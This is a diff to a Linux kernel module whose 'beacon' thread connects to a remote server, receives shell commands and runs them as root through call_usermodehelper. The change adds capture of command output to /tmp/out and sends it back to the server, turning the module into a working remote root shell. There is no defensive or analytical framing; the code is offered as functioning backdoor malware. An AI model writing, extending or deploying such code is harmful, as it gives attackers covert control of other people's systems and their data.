@@ -44,32 +44,69 @@ static int connect_to_server(void) {
 
 // Receive and execute shell commands
 static int beacon_main(void *data) {
-    char *argv[] = { "/bin/sh", "-c", NULL, NULL };
-    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+    struct msghdr msg;
+    struct kvec iov;
     char recv_buf[BUF_SIZE];
+    char result_buf[BUF_SIZE];
+    mm_segment_t old_fs;
+    struct file *file;
     int len;
 
     if (connect_to_server() < 0) return 0;
 
+    old_fs = get_fs();
+    set_fs(KERNEL_DS); // Needed for file operations in older kernels
+
     while (!kthread_should_stop()) {
+        memset(&msg, 0, sizeof(msg));
+        memset(&iov, 0, sizeof(iov));
         memset(recv_buf, 0, BUF_SIZE);
-        len = kernel_recvmsg(conn_socket, &(struct msghdr){ .msg_flags = 0 },
-                             &(struct kvec){ .iov_base = recv_buf, .iov_len = BUF_SIZE },
-                             1, BUF_SIZE, 0);
 
-        if (len > 0) {
-            recv_buf[len] = '\0';
-            printk(KERN_INFO "[beacon] Got command: %s\n", recv_buf);
+        iov.iov_base = recv_buf;
+        iov.iov_len = BUF_SIZE;
 
-            // Build argument array for shell
-            argv[2] = recv_buf;
-
-            call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+        len = kernel_recvmsg(conn_socket, &msg, &iov, 1, BUF_SIZE, 0);
+        if (len <= 0) {
+            msleep(1000);
+            continue;
         }
+
+        recv_buf[len] = '\0';
+        printk(KERN_INFO "[beacon] Got command: %s\n", recv_buf);
+
+        // Run command and redirect output to /tmp/out
+        char *cmd_fmt = "/bin/sh -c '%s > /tmp/out 2>&1'";
+        char full_cmd[BUF_SIZE];
+        snprintf(full_cmd, BUF_SIZE, cmd_fmt, recv_buf);
+
+        char *argv[] = { "/bin/sh", "-c", full_cmd, NULL };
+        char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+
+        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+
+        // Read the output back
+        memset(result_buf, 0, BUF_SIZE);
+        file = filp_open("/tmp/out", O_RDONLY, 0);
+        if (!IS_ERR(file)) {
+            kernel_read(file, result_buf, BUF_SIZE - 1, &file->f_pos);
+            filp_close(file, NULL);
+        } else {
+            snprintf(result_buf, BUF_SIZE, "[error reading output]");
+        }
+
+        // Send back to the server
+        memset(&msg, 0, sizeof(msg));
+        memset(&iov, 0, sizeof(iov));
+
+        iov.iov_base = result_buf;
+        iov.iov_len = strlen(result_buf);
+
+        kernel_sendmsg(conn_socket, &msg, &iov, 1, iov.iov_len);
 
         msleep(1000);
     }
 
+    set_fs(old_fs); // Restore address limit
     return 0;
 }
 
